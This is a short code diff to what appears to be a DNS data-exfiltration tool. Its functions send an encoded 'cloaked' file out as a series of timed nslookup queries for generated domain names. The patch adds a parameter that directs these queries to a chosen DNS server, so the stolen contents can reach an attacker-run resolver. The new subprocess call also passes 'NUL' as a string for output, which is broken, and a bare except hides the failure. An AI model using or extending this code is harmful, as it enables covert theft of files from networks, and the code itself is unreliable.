@@ -488,9 +488,9 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 #
 #========================================================================
 
-def TransferCloakedFile( cloakedFile, queryDelay ):
+def TransferCloakedFile( cloakedFile, queryDelay, dns ):
 
-	status = GenerateDNSQueries( cloakedFile,  queryDelay )
+	status = GenerateDNSQueries( cloakedFile,  queryDelay, dns)
 
 	return
 
@@ -515,7 +515,7 @@ def TransferCloakedFile( cloakedFile, queryDelay ):
 #
 #========================================================================
 
-def GenerateDNSQueries(cloakedFile, queryDelay):
+def GenerateDNSQueries(cloakedFile, queryDelay, dns='localhost'):
     tmpAddrStr = ""
     byteCount = 0
     
@@ -525,7 +525,7 @@ def GenerateDNSQueries(cloakedFile, queryDelay):
             fqdnStr = fqdn.strip()
             # We don't care if the lookup fails, so carry on
             try:
-                ret = subprocess.check_output(['nslookup', fqdnStr])
+                ret = subprocess.run(['nslookup', fqdnStr, dns], stdout='NUL',stderr='NUL')
                 time.sleep(queryDelay)
             except:
                 time.sleep(queryDelay)
